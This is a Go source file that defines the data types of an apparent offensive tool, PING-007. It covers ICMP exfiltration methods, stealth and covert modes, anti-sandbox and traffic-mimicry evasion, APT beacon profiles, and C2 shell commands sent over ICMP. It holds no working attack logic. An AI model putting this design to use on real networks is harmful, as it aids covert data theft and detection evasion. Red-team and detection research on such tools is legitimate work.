// Package types defines the shared data structures and constants used across
// all PING-007 subsystems: network, crypto, evasion, exfiltration, and shell.
package types

import (
	"time"
)

// ExfiltrationMethod is the ICMP technique used to carry data.
// icmp_tunnel and icmp_payload are production-ready; icmp_timing and
// icmp_sequence are experimental and not exposed in the CLI.
type ExfiltrationMethod string

const (
	ExfilICMPTunnel  ExfiltrationMethod = "icmp_tunnel"  // steganographic embedding in OS ping patterns
	ExfilICMPPayload ExfiltrationMethod = "icmp_payload" // data in ICMP payload field with header
	ExfilICMPTiming  ExfiltrationMethod = "icmp_timing"  // encode bits in inter-packet delay (experimental)
	ExfilICMPSeq     ExfiltrationMethod = "icmp_sequence" // encode bits in ICMP sequence number field (experimental)
)

// ExfiltrationMode controls the speed/stealth trade-off.
type ExfiltrationMode string

const (
	ModeStealth  ExfiltrationMode = "stealth"  // timing delays between chunks (default)
	ModeFast     ExfiltrationMode = "fast"     // no delays; maximum throughput
	ModeReliable ExfiltrationMode = "reliable" // retransmit on loss; slowest
	ModeCovert   ExfiltrationMode = "covert"   // maximum fragmentation and padding
)

// EvasionTechnique identifies a specific evasion layer that can be applied
// independently or in combination.
type EvasionTechnique string

const (
	TechCryptoAgility     EvasionTechnique = "crypto_agility"     // rotate encryption algorithm per session
	TechAntiSandbox       EvasionTechnique = "anti_sandbox"       // detect and abort in sandbox environments
	TechTimingEvasion     EvasionTechnique = "timing_evasion"     // adaptive delays mimicking legitimate services
	TechTrafficPadding    EvasionTechnique = "traffic_padding"    // random padding to obscure payload size
	TechDataObfuscation   EvasionTechnique = "data_obfuscation"   // inject fake data chunks
	TechBehavioralMimicry EvasionTechnique = "behavioral_mimicry" // mimic OS ping byte patterns
)

// APTProfile identifies a threat-actor behavioral profile used by the "apt" subcommand.
type APTProfile string

const (
	APTLazarus  APTProfile = "lazarus"  // Lazarus Group (DPRK) — 5min to 1h beacon
	APTAPT29    APTProfile = "apt29"    // Cozy Bear (RU) — 30min to 2h beacon
	APTAPT28    APTProfile = "apt28"    // Fancy Bear (RU) — 10min to 30min beacon
	APTEquation APTProfile = "equation" // Equation Group (NSA) — 1day to 3day beacon
)

// CryptoAlgorithm identifies a supported encryption algorithm in the crypto engine.
// CryptoRSAHybrid is defined for completeness but has no implementation; do not use it.
type CryptoAlgorithm string

const (
	CryptoAES256    CryptoAlgorithm = "aes256"     // AES-256-GCM with PBKDF2 key derivation
	CryptoChaCha20  CryptoAlgorithm = "chacha20"   // ChaCha20-Poly1305 with PBKDF2 key derivation
	CryptoCustomXOR CryptoAlgorithm = "custom_xor" // XOR-CFB with HMAC-SHA256 authentication
	CryptoRSAHybrid CryptoAlgorithm = "rsa_hybrid" // reserved — not implemented
)

// ChunkStatus tracks the lifecycle of a single data chunk during exfiltration.
type ChunkStatus string

const (
	StatusPending      ChunkStatus = "pending"      // queued, not yet sent
	StatusSending      ChunkStatus = "sending"      // in flight
	StatusSent         ChunkStatus = "sent"         // transmitted, awaiting acknowledgement
	StatusAcknowledged ChunkStatus = "acknowledged" // confirmed received
	StatusFailed       ChunkStatus = "failed"       // exhausted retries
)

// DataChunk is a fragment of a larger payload prepared for ICMP transmission.
type DataChunk struct {
	ID          int         `json:"id"`
	Data        []byte      `json:"data"`
	TotalChunks int         `json:"total_chunks"`
	Checksum    string      `json:"checksum"`
	Status      ChunkStatus `json:"status"`
	Timestamp   time.Time   `json:"timestamp"`
	RetryCount  int         `json:"retry_count"`
}

// ExfilJob describes an exfiltration operation — its source, destination,
// method, and runtime options.
type ExfilJob struct {
	ID             string             `json:"id"`
	SourcePath     string             `json:"source_path,omitempty"`
	Data           []byte             `json:"data,omitempty"`
	Target         string             `json:"target"`
	Method         ExfiltrationMethod `json:"method"`
	Mode           ExfiltrationMode   `json:"mode"`
	ChunkSize      int                `json:"chunk_size"`
	MaxRetries     int                `json:"max_retries"`
	StealthEnabled bool               `json:"stealth_enabled"`
	EncryptEnabled bool               `json:"encrypt_enabled"`
	Signature      string             `json:"signature"` // OS signature for TTL and steganographic payload format
	Metadata       map[string]any     `json:"metadata"`
	CreatedAt      time.Time          `json:"created_at"`
}

// ExfilResult is the outcome of a completed exfiltration job.
type ExfilResult struct {
	JobID       string         `json:"job_id"`
	Success     bool           `json:"success"`
	ChunksSent  int            `json:"chunks_sent"`
	ChunksTotal int            `json:"chunks_total"`
	BytesSent   int64          `json:"bytes_sent"`
	Duration    time.Duration  `json:"duration"`
	Errors      []string       `json:"errors"`
	Metadata    map[string]any `json:"metadata"`
	CompletedAt time.Time      `json:"completed_at"`
}

// NetworkPacket holds a single ICMP echo request or reply with its payload
// and extracted metadata.
type NetworkPacket struct {
	Payload  []byte         `json:"payload"`
	Headers  map[string]any `json:"headers"`
	Checksum uint16         `json:"checksum,omitempty"`
	Metadata PacketMetadata `json:"metadata"`
}

// PacketMetadata carries per-packet timing, addressing, and session info.
type PacketMetadata struct {
	Timestamp  time.Time `json:"timestamp"`
	SourceIP   string    `json:"source_ip,omitempty"`
	DestIP     string    `json:"dest_ip,omitempty"`
	Protocol   string    `json:"protocol"`
	Size       int       `json:"size"`
	SequenceID uint16    `json:"sequence_id,omitempty"`
	SessionID  string    `json:"session_id,omitempty"`
	Priority   string    `json:"priority"`
	Retries    int       `json:"retries"`
	MaxRetries int       `json:"max_retries"`
}

// NetworkMetrics accumulates packet and byte counts plus latency and throughput
// measured over the life of a NetworkService.
type NetworkMetrics struct {
	PacketsSent      int64     `json:"packets_sent"`
	PacketsReceived  int64     `json:"packets_received"`
	BytesTransmitted int64     `json:"bytes_transmitted"`
	BytesReceived    int64     `json:"bytes_received"`
	Errors           int64     `json:"errors"`
	LatencyMs        float64   `json:"latency_ms"`
	ThroughputBps    float64   `json:"throughput_bps"`
	LastUpdated      time.Time `json:"last_updated"`
}

// SecurityEvent is a structured audit log entry emitted by any framework
// component that observes a notable security-relevant action.
type SecurityEvent struct {
	EventType     string         `json:"event_type"`
	Severity      string         `json:"severity"`
	Message       string         `json:"message"`
	Timestamp     time.Time      `json:"timestamp"`
	SessionID     string         `json:"session_id,omitempty"`
	TargetIP      string         `json:"target_ip,omitempty"`
	Technique     string         `json:"technique,omitempty"`
	Component     string         `json:"component,omitempty"`
	Metadata      map[string]any `json:"metadata"`
	SecurityLevel string         `json:"security_level"`
}

// EvasionResult records whether a single evasion technique succeeded,
// along with confidence and timing data.
type EvasionResult struct {
	Technique     EvasionTechnique `json:"technique"`
	Success       bool             `json:"success"`
	Confidence    float64          `json:"confidence"`
	Metadata      map[string]any   `json:"metadata"`
	ExecutionTime time.Duration    `json:"execution_time"`
	Timestamp     time.Time        `json:"timestamp"`
}

// TimingProfile defines the delay characteristics for one behavioral profile —
// legitimate service mimicry or APT beacon simulation.
type TimingProfile struct {
	MinDelay         time.Duration `json:"min_delay"`
	MaxDelay         time.Duration `json:"max_delay"`
	JitterFactor     float64       `json:"jitter_factor"`
	BurstProbability float64       `json:"burst_probability"`
	PauseProbability float64       `json:"pause_probability"`
	ActivityPattern  []float64     `json:"activity_pattern"`
}

// APTProfileConfig holds behavioral parameters for a simulated threat actor.
type APTProfileConfig struct {
	Description      string          `json:"description"`
	TimingRange      [2]int          `json:"timing_range"`      // [min, max] beacon interval in seconds
	SizeRange        [2]int          `json:"size_range"`        // [min, max] packet size in bytes
	CryptoPreference CryptoAlgorithm `json:"crypto_preference"` // preferred encryption algorithm
	Sophistication   string          `json:"sophistication"`    // high, very_high, nation_state
}

// SandboxDetectionResult is the output of the sandbox heuristic checks.
// IsSandbox is true when Confidence exceeds the configured threshold.
type SandboxDetectionResult struct {
	IsSandbox  bool           `json:"is_sandbox"`
	Confidence float64        `json:"confidence"`
	Indicators []string       `json:"indicators"`
	Details    map[string]any `json:"details"`
	CheckedAt  time.Time      `json:"checked_at"`
}

// ShellCommand is a C2 command sent from the operator to the remote agent
// via an ICMP shell session.
type ShellCommand struct {
	ID         string    `json:"id"`
	Type       string    `json:"type"`
	Command    string    `json:"command"`
	Args       []string  `json:"args"`
	WorkingDir string    `json:"working_dir,omitempty"`
	Timeout    int       `json:"timeout"`
	Timestamp  time.Time `json:"timestamp"`
}

// ShellResponse carries the result of a remote command execution back to
// the operator over ICMP.
type ShellResponse struct {
	CommandID     string        `json:"command_id"`
	Success       bool          `json:"success"`
	Stdout        string        `json:"stdout"`
	Stderr        string        `json:"stderr"`
	ReturnCode    int           `json:"return_code"`
	ExecutionTime time.Duration `json:"execution_time"`
	Timestamp     time.Time     `json:"timestamp"`
}
